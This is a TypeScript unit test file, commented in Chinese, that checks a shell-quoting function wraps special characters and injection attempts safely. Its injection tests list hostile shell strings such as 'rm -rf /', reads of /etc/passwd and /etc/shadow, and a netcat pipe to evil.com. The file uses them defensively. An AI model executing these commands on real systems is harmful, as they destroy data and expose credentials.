/**
 * @file util/shell-quote.ts 单元测试
 * @description 覆盖 quote() 的基本功能、特殊字符、注入防护、Unicode、边界情况和幂等性。
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { quote } from '../../src/util/shell-quote.js';

describe('quote', () => {
  // ─── 基本功能 ───────────────────────────────────────────────
  describe('基本功能', () => {
    it('空字符串返回两个单引号', () => {
      assert.equal(quote(''), "''");
    });

    it('普通纯字母字符串不加引号', () => {
      assert.equal(quote('hello'), 'hello');
    });

    it('含数字和下划线的字符串不加引号', () => {
      assert.equal(quote('foo_bar123'), 'foo_bar123');
    });

    it('含安全符号的字符串不加引号', () => {
      assert.equal(quote('a@b%c+d=e:f,g.h/i-j'), 'a@b%c+d=e:f,g.h/i-j');
    });

    it('含空格的字符串用单引号包裹', () => {
      assert.equal(quote('hello world'), "'hello world'");
    });

    it('以空格开头的字符串用单引号包裹', () => {
      assert.equal(quote(' leading'), "' leading'");
    });

    it('以空格结尾的字符串用单引号包裹', () => {
      assert.equal(quote('trailing '), "'trailing '");
    });
  });

  // ─── 特殊字符 ───────────────────────────────────────────────
  describe('特殊字符', () => {
    it('包含单引号的字符串被正确转义', () => {
      // it's → 'it'\''s'
      assert.equal(quote("it's"), "'it'\\''s'");
    });

    it('多个单引号都被转义', () => {
      // a'b'c → 'a'\''b'\''c'
      assert.equal(quote("a'b'c"), "'a'\\''b'\\''c'");
    });

    it('仅含单引号的字符串', () => {
      // ' → ''\''' （开引号 + 转义序列'\'' + 闭引号）
      assert.equal(quote("'"), "''\\'''");
    });

    it('双引号不需要额外处理（在单引号内是字面量）', () => {
      assert.equal(quote('say "hi"'), "'say \"hi\"'");
    });

    it('反斜杠在单引号内是字面量', () => {
      assert.equal(quote('back\\slash'), "'back\\slash'");
    });

    it('美元符号在单引号内是字面量', () => {
      assert.equal(quote('$HOME'), "'$HOME'");
    });

    it('反引号在单引号内是字面量', () => {
      assert.equal(quote('`whoami`'), "'`whoami`'");
    });

    it('换行符在单引号内保留', () => {
      assert.equal(quote('line1\nline2'), "'line1\nline2'");
    });

    it('制表符在单引号内保留', () => {
      assert.equal(quote('col1\tcol2'), "'col1\tcol2'");
    });

    it('回车符在单引号内保留', () => {
      assert.equal(quote('cr\rhere'), "'cr\rhere'");
    });
  });

  // ─── Shell 注入防护 ────────────────────────────────────────
  describe('Shell 注入防护', () => {
    it('分号命令分隔被安全包裹', () => {
      const result = quote('; rm -rf /');
      assert.equal(result, "'; rm -rf /'");
      assert.ok(!result.includes('; ') || result.startsWith("'"));
    });

    it('命令替换 $() 被安全包裹', () => {
      const result = quote('$(cat /etc/passwd)');
      assert.equal(result, "'$(cat /etc/passwd)'");
    });

    it('反引号命令替换被安全包裹', () => {
      const result = quote('`id`');
      assert.equal(result, "'`id`'");
    });

    it('管道符被安全包裹', () => {
      const result = quote('| nc evil.com 4444');
      assert.equal(result, "'| nc evil.com 4444'");
    });

    it('后台执行符 & 被安全包裹', () => {
      const result = quote('& background');
      assert.equal(result, "'& background'");
    });

    it('重定向 > 被安全包裹', () => {
      const result = quote('> /dev/null');
      assert.equal(result, "'> /dev/null'");
    });

    it('重定向 < 被安全包裹', () => {
      const result = quote('< /etc/shadow');
      assert.equal(result, "'< /etc/shadow'");
    });

    it('逻辑或 || 被安全包裹', () => {
      const result = quote('|| echo pwned');
      assert.equal(result, "'|| echo pwned'");
    });

    it('逻辑与 && 被安全包裹', () => {
      const result = quote('&& rm -rf /');
      assert.equal(result, "'&& rm -rf /'");
    });

    it('通配符 * 被安全包裹', () => {
      const result = quote('*.txt');
      assert.equal(result, "'*.txt'");
    });

    it('问号通配符被安全包裹', () => {
      const result = quote('file?.log');
      assert.equal(result, "'file?.log'");
    });

    it('括号被安全包裹', () => {
      const result = quote('(subshell)');
      assert.equal(result, "'(subshell)'");
    });

    it('花括号展开被安全包裹', () => {
      const result = quote('{a,b,c}');
      assert.equal(result, "'{a,b,c}'");
    });

    it('波浪号展开被安全包裹', () => {
      const result = quote('~user/bin');
      assert.equal(result, "'~user/bin'");
    });

    it('注释符 # 被安全包裹', () => {
      const result = quote('# not a comment');
      assert.equal(result, "'# not a comment'");
    });

    it('复合注入尝试被安全包裹', () => {
      const malicious = "'; $(rm -rf /); echo '";
      const result = quote(malicious);
      // 结果应该以单引号开头和结尾，内部单引号被转义
      assert.ok(result.startsWith("'"));
      assert.ok(result.endsWith("'"));
      // 不应存在未转义的单引号断裂
      assert.ok(!result.includes("' "));
    });
  });

  // ─── Unicode / 中文 ────────────────────────────────────────
  describe('Unicode / 中文', () => {
    it('中文字符被安全包裹', () => {
      const result = quote('你好世界');
      assert.equal(result, "'你好世界'");
    });

    it('中日韩混合被安全包裹', () => {
      const result = quote('こんにちは안녕하세요');
      assert.equal(result, "'こんにちは안녕하세요'");
    });

    it('emoji 被安全包裹', () => {
      const result = quote('🚀🎉');
      assert.equal(result, "'🚀🎉'");
    });

    it('中英文混合被安全包裹', () => {
      const result = quote('hello 世界 test');
      assert.equal(result, "'hello 世界 test'");
    });

    it('含中文路径', () => {
      const result = quote('/home/用户/文档/file.txt');
      assert.equal(result, "'/home/用户/文档/file.txt'");
    });

    it('零宽字符被安全包裹', () => {
      const result = quote('a\u200Bb'); // 零宽空格
      assert.equal(result, "'a\u200Bb'");
    });

    it('组合字符被安全包裹', () => {
      const result = quote('é'); // e + combining acute accent
      assert.ok(result.startsWith("'"));
      assert.ok(result.endsWith("'"));
    });
  });

  // ─── 边界情况 ───────────────────────────────────────────────
  describe('边界情况', () => {
    it('超长字符串被正确处理', () => {
      const long = 'a'.repeat(100000);
      const result = quote(long);
      assert.equal(result, long); // 纯安全字符，不加引号
    });

    it('超长含特殊字符字符串被正确处理', () => {
      const long = 'a b'.repeat(50000);
      const result = quote(long);
      assert.ok(result.startsWith("'"));
      assert.ok(result.endsWith("'"));
      assert.equal(result.length, long.length + 2); // 加两个引号
    });

    it('全空白字符串被包裹', () => {
      assert.equal(quote('   '), "'   '");
    });

    it('单个字符（安全）不加引号', () => {
      assert.equal(quote('a'), 'a');
    });

    it('单个字符（不安全）加引号', () => {
      assert.equal(quote(' '), "' '");
    });

    it('null 字节被安全包裹', () => {
      const result = quote('a\x00b');
      assert.equal(result, "'a\x00b'");
    });

    it('连续单引号被逐一转义', () => {
      // ''' → 每个 ' 替换为 '\''，再包裹：''\'''\'''\'''
      assert.equal(quote("'''"), "''\\'''\\'''\\'''");
    });

    it('首尾都是单引号', () => {
      // 'hello' → ''\''hello'\'''
      const result = quote("'hello'");
      assert.equal(result, "''\\''hello'\\'''");
    });

    it('换行+单引号组合', () => {
      const result = quote("line1\n'line2'");
      assert.equal(result, "'line1\n'\\''line2'\\'''");
    });
  });

  // ─── 幂等性与安全性 ────────────────────────────────────────
  describe('幂等性与安全性', () => {
    it('对已 quote 的结果再次 quote 仍然安全', () => {
      const original = "test'value";
      const once = quote(original);
      const twice = quote(once);
      // twice 应该是安全的 shell 字面量
      assert.ok(twice.startsWith("'") || /^[A-Za-z0-9_@%+=:,./-]+$/.test(twice));
      // 两次 quote 不等于一次（因为单引号本身需要转义），但必须安全
      // 这里只验证不崩溃且输出合法
      assert.ok(typeof twice === 'string');
      assert.ok(twice.length > 0);
    });

    it('空字符串双重 quote 仍安全', () => {
      const once = quote('');
      assert.equal(once, "''");
      const twice = quote(once);
      // '' 包含单引号，所以会被包裹并转义：''\'''\'\'
      assert.equal(twice, "''\\'''\\'''");
    });

    it('安全字符串双重 quote 等于自身', () => {
      const safe = 'hello_world';
      assert.equal(quote(safe), safe);
      assert.equal(quote(quote(safe)), safe);
    });

    it('所有测试输入经 quote 后不含裸 shell 元字符', () => {
      const dangerousInputs = [
        '; rm -rf /',
        '$(whoami)',
        '`id`',
        '| cat /etc/passwd',
        '& bg',
        '> /tmp/x',
        '< /etc/shadow',
        '|| true',
        '&& false',
        '*.glob',
        '~expand',
        '#comment',
        '(sub)',
        '{brace}',
      ];
      for (const input of dangerousInputs) {
        const result = quote(input);
        // 结果要么是全安全字符，要么以单引号包裹
        const isSafe =
          /^[A-Za-z0-9_@%+=:,./-]+$/.test(result) ||
          (result.startsWith("'") && result.endsWith("'"));
        assert.ok(isSafe, `quote(${JSON.stringify(input)}) = ${JSON.stringify(result)} 不安全`);
      }
    });
  });
});
